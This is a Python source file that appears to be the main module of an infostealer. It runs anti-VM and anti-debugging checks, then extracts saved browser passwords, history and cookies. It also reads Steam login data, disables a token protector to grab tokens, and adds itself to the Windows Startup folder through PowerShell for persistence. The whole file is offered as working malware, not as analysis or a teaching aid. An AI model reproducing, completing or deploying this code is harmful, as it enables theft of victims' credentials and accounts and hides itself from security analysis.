import os
import sys
import vdf

from core.componets import extractor
from core.componets import antivm
from core.componets import sysinfo
from core.componets import tokengrabber

class Main:
    def __init__(self) -> None:
        pass

    def antivm(self):
        if antivm.Antivm.run():
            sys.quit()
        
        antivm.AntiDebug.checks()
        
    def browser(self):
        for key in extractor.browsers_profile:
            browser = extractor.browsers_profile[key]

            if os.path.exists(browser):
                profiles = ["Default"]

                for file in os.listdir(browser):
                    if file.lower().startswith("profile"):
                        profiles.append(file)
                
                for profile in profiles:
                    extraction = extractor.Extract(os.path.join(browser, "Local State"))
                    passwds = extraction.extractPasswords(os.path.join(browser, profile, "Login Data"))
                    history = extraction.extractHistory(os.path.join(browser, profile, "History"))
                    cookies = extraction.extractCookies(os.path.join(browser, profile))

        for key in extractor.browsers:
            browser = extractor.browsers[key]

            if os.path.exists(browser):
                extraction = extractor.Extract(os.path.join(browser, "Local State"))
                passwds = extraction.extractPasswords(os.path.join(browser, "Login Data"))
                history = extraction.extractHistory(os.path.join(browser, "History"))
                cookies = extraction.extractCookies(os.path.join(browser))

    def steam(self):
        steamUsers = os.path.abspath(os.path.join(os.sep, "Program Files (x86)", "Steam", "config", "loginusers.vdf"))

        if os.path.exists(steamUsers):
            with open(steamUsers, "r") as f:
                usersConfig = vdf.loads(f.read())

            return usersConfig
        
    def addStartup(self, linkname: str, pathExec: str):
        script = f"""

        $sh = New-Object -ComObject WScript.Shell
        $userStartupFolderPath = [Environment]::GetFolderPath("Startup")
        $shortcutFile = $sh.CreateShortcut("$userStartupFolderPath\{linkname}.lnk")
        $shortcutFile.TargetPath = "{pathExec}"
        $shortcutFile.Save()
        """
        sysinfo.runPowershell(script)


    def token(self):
        extractor.Anti_tokenprotector.killprotector()
        tokens = tokengrabber.extract_tokens().tokens
        # print(tokens)

    def run(self):
        antivm.Antivm.run()
        antivm.Antidbg.proc_check()
        antivm.Antidbg.dll_check()

        # antivm.Antidbg.process_check()

        self.steam()
        self.browser()
        self.token()
        self.addStartup("ciao", os.path.realpath(__file__))

if __name__ == "__main__":
    Main().run()